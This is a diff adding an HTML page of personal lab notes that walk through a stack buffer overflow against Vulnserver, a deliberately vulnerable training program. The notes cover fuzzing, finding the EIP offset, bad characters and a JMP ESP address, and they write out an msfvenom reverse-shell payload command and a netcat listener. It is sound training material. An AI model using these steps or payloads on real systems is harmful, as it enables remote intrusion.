@@ -1,0 +1,213 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Vulnserver</title>
+</head><body><br/>
+<br/>
+<img src="image.png"/><br/>
+<br/>
+<br/>
+<img src="image 2.png"/><br/>
+<br/>
+ip of windows 10:192.168.57.13<br/>
+by default vulnserver runs of port 9999 <br/>
+<br/>
+run both immunity debugger and vulnserver as administrator<br/>
+<br/>
+#nc -nv 192.168.57.13 9999<br/>
+vulnserver open on port 999 so connect to it<br/>
+<br/>
+<img src="image 3.png"/><br/>
+<br/>
+<img src="image 4.png"/><br/>
+<br/>
+#generic_send_tcp 192.168.57.13 9999 stats.spk 0 0<br/>
+stats not vulnerable<br/>
+<br/>
+<br/>
+now spike trun <br/>
+#generic_send_tcp 192.168.57.13 9999 trun.spk 0 0<br/>
+<br/>
+this pauses immunity debugger<br/>
+and also crashes vulnserver<br/>
+<br/>
+<img src="image 5.png"/><br/>
+<br/>
+EBP=41414141(hexadecimal)=AAAA(text equivalent)<br/>
+<img src="image 6.png"/><br/>
+<br/>
+<img src="image 7.png"/><br/>
+need to / .:/ after trun coz in immunity there are these char after trun so we need to add them so it accepts the cmd<br/>
+<br/>
+<img src="image 8.png"/><br/>
+initially, buffer=100 times A i.e 100 A's<br/>
+connect to vulnerable machine ip(windows 10 ip)<br/>
+vulnserver runs on port 9999 <br/>
+connect and send TRUN .:/+buffer<br/>
+keep sending buffer as long as there is a connection<br/>
+when connection closes,except part of code runs returning when the connection was closed since vulnserver crashes<br/>
+<br/>
+<img src="image 9.png"/><br/>
+<br/>
+<img src="image 10.png"/><br/>
+<br/>
+didnt overwrite the EIP,just the crash occured<br/>
+<br/>
+Finding where we overwrite EIP<br/>
+<br/>
+#/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2100 <br/>
+<img src="image 11.png"/><br/>
+<br/>
+generate offset of length 3000 bytes<br/>
+vulnserver crashed near 2100 Bytes but here we generate more length offset coz we also need to find EIP offset so we need more character(or more Bytes)<br/>
+in python,1 char =1 Byte<br/>
+<br/>
+<img src="image 12.png"/><br/>
+<br/>
+paste the pattern in 2.py and run it<br/>
+<br/>
+<img src="image 13.png"/><br/>
+EIP has a pattern: 386F4337<br/>
+<br/>
+<img src="image 14.png"/><br/>
+at 2003 bytes we can control EIP<br/>
+EIP has 2003 bytes before it<br/>
+<br/>
+Overwriting EIP<br/>
+<br/>
+EIP: 386F4337=6 hex= 4 bytes<br/>
+so EIP is 4 bytes long<br/>
+<br/>
+<img src="image 15.png"/><br/>
+<br/>
+send A 2003 times=2003 bytes till we reach EIP<br/>
+next send B 4 times or 4 Bytes which will be reflected in EIP if everything we did was correct<br/>
+<br/>
+<br/>
+<img src="image 16.png"/><br/>
+<br/>
+BBBB=42424242 (in hex) <br/>
+<br/>
+<img src="image 17.png"/><br/>
+EBP:41414141=AAAA<br/>
+EIP=42424242(so what we did was correct)<br/>
+<br/>
+Finding Bad Characters<br/>
+<br/>
+badchars - <a href="https://github.com/cytopia/badchars">https://github.com/cytopia/badchars</a> <br/>
+some chars are good for shellcode and some are bad for shell code<br/>
+<br/>
+**by default x00(null char) is a badchar so remove it from copied badchars<br/>
+<img src="image 18.png"/><br/>
+<br/>
+<br/>
+for some reason ./4.py dosent work but python3 4.py works so use<br/>
+#python3 4.py<br/>
+<br/>
+again vulnserver crashes but this time we are interested in hexdump<br/>
+<img src="image 19.png"/><br/>
+do this<br/>
+<br/>
+<img src="image 20.png"/><br/>
+<br/>
+<img src="image 21.png"/><br/>
+same value as that in ESP<br/>
+we sent x01 so we expect 1<br/>
+then x02=2 and so on<br/>
+we sent till FF so check if anything out of place till FF<br/>
+<br/>
+there are none<br/>
+if there were any like<br/>
+10 11 13 ..<br/>
+that means 12 is a badchar <br/>
+<br/>
+if consecutively badchar eg<br/>
+<br/>
+10 11 B0 B1 14..<br/>
+only the first 1 is badchar so on B0 is bad char not B1<br/>
+<br/>
+Finding right Module<br/>
+<br/>
+!mona module :in the white space<br/>
+<img src="image 22.png"/><br/>
+<br/>
+that pops up a window like this<br/>
+we are looking for ssomething attached to vulnserver and having all FALSE since false means no protection<br/>
+that module here is essfunc.dll<br/>
+<img src="image 23.png"/><br/>
+<br/>
+<br/>
+tool:nasm_shell<br/>
+find hex equivalent of assembly<br/>
+<br/>
+<img src="image 24.png"/><br/>
+<br/>
+<br/>
+<img src="image 25.png"/><br/>
+<br/>
+<br/>
+JMP ESP= FFE4<br/>
+<br/>
+#!mona find -s &quot;\xff\xe4&quot; -m essfunc.dll<br/>
+since essfunc.dll has no protection on<br/>
+<br/>
+<img src="image 26.png"/><br/>
+<br/>
+0x625011af:return address<br/>
+note it down and write it in .py file<br/>
+<br/>
+x86 stores lowerbyte at lower address and higher byte at higher address so code will be(this format of storing called Little Endian format)<br/>
+<br/>
+<img src="image 27.png"/><br/>
+<br/>
+gonna throw same error but should jmp<br/>
+<br/>
+<img src="image 28.png"/><br/>
+click on red marked arrow and type return address<br/>
+<br/>
+<img src="image 29.png"/><br/>
+<br/>
+click on address and press F2 to add break point<br/>
+what break point does is it allows to excute/overflow before it but as soon as it reaches that address, it stops for further instructions<br/>
+<br/>
+run code<br/>
+#python3 5.py<br/>
+<img src="image 30.png"/><br/>
+<br/>
+instead of payload.encode()<br/>
+write b in front of &quot;A&quot; and &quot;TRUN / .:/&quot;<br/>
+this means we are byte encoding<br/>
+this is done when patload.encode dosent work sometimes<br/>
+<br/>
+<img src="image 31.png"/><br/>
+<br/>
+625011af reflected in EIP<br/>
+<br/>
+#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.57.5 LPORT=4444 EXITFUNC=thread -f c -a x86 -b &quot;\x00&quot;<br/>
+<br/>
+<img src="image 32.png"/><br/>
+-p:payload<br/>
+set payload for windows<br/>
+LHOST: us<br/>
+-a:architechture<br/>
+-b:badchar<br/>
+\x00 nullbyte always a badchar<br/>
+<br/>
+<img src="image 33.png"/><br/>
+<br/>
+<img src="image 34.png"/><br/>
+<br/>
+2003 bytes to reach to EIP,when we reach to EIP, JMP to ESP and provide set of instructions i.e overflow which will excute reverse shell<br/>
+write b infront of all quotes for byte encoding<br/>
+jump to given address and excute the payload<br/>
+<br/>
+x90:NOP(no operation) used for adding padding space<br/>
+we are giving 32 Bytes padding of NOP<br/>
+<br/>
+#nc -nvlp 4444<br/>
+#python3 6.py<br/>
+<br/>
+<img src="image 35.png"/><br/>
+<br/>
+<br/>
+aanddd we get a reverse shell</body></html>
